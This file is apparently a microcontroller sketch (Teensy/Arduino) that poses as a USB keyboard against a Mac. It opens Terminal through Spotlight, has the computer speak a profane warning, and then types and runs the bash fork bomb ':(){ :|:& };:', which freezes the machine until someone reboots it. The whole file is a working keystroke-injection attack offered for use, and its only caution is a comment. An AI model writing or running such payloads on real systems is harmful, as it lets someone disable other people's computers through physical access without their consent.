//opens up terminal and executes a fork bomb ( https://en.wikipedia.org/wiki/Fork_bomb )
//the bomb will quickly freeze the computer and render it useless until someone reboots the computer
//***be careful with this one****

int led=13;
void setup() {
  pinMode(led, OUTPUT);
  delay(5000);
  //wait 5s before doing anything

  digitalWrite(led, HIGH);
  //turn on LED so we know the exploit is being executed
  Keyboard.begin();
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.press(KEY_SPACE);
  Keyboard.releaseAll();
  //evoke Spotlight

  delay(500);
  //give spotlight half a second to open up

  Keyboard.print("Terminal");
  delay(1000);
  //wait a second for spotlight to find terminal
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  //open up terminal

  delay(2000);
  //give the terminal 2s to initialize

  Keyboard.write("echo WARNING: FORK BOMB WILL BE EXECUTED IN FIVE SECONDS!");
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  Keyboard.write("say 'WARNING: FORK BOMB WILL BE EXECUTED IN FIVE SECONDS!''");
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  delay(5000);
  //show some mercy before executing the bomb.  comment this chunk out if you want.

  Keyboard.write("say 'You have had your warning... Bombs away, motherfucker.'");
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  Keyboard.write(":(){ :|:& };:");
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  //bombs away!
}

void loop() {
  digitalWrite(led, HIGH);
  delay(500);
  digitalWrite(led, LOW);
  delay(500);
  //blink so we know we're done
}
